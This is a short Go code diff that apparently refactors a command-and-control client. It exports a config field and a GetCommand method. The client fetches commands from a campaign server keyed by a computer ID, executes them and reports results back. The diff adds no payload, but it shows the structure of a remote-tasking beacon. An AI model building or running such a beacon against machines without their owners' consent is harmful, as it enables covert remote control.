@@ -16,7 +16,7 @@ import (
 var ErrNoCommandsFound = errors.New("Server did not return any commands")
 
 type Client struct {
-	config   ClientConfig
+	Config   ClientConfig
 	Campaign model.Campaign
 	coder    model.Coder
 
@@ -38,7 +38,7 @@ func NewClient() Client {
 }
 
 func (s Client) CommandGetUrl() string {
-	return s.Campaign.ServerUrl + s.Campaign.CommandGetPath + s.config.ComputerId
+	return s.Campaign.ServerUrl + s.Campaign.CommandGetPath + s.Config.ComputerId
 }
 
 func (s Client) CommandSendUrl() string {
@@ -85,12 +85,12 @@ func (s Client) sendPing() {
 	arguments := make(model.CmdArgument)
 	arguments["msg"] = "ooy!"
 	response := make(model.CmdResponse)
-	command := model.NewCommand("ping", s.config.ComputerId, "0", arguments, response)
+	command := model.NewCommand("ping", s.Config.ComputerId, "0", arguments, response)
 	s.sendCommand(command)
 }
 
 func (s Client) requestAndExecute() {
-	command, err := s.getCommand()
+	command, err := s.GetCommand()
 	if err != nil {
 		if err == ErrNoCommandsFound {
 			fmt.Print(".")
@@ -122,7 +122,7 @@ func (s Client) requestAndExecute() {
 	}
 }
 
-func (s Client) getCommand() (model.CommandBase, error) {
+func (s Client) GetCommand() (model.CommandBase, error) {
 	url := s.CommandGetUrl()
 	resp, err := s.HttpGet(url)
 	if err != nil {
@@ -151,7 +151,7 @@ func (s Client) sendCommand(command model.CommandBase) error {
 	url := s.CommandSendUrl()
 
 	// Setup response
-	command.ComputerId = s.config.ComputerId
+	command.ComputerId = s.Config.ComputerId
 	json, err := json.Marshal(command)
 	if err != nil {
 		return err
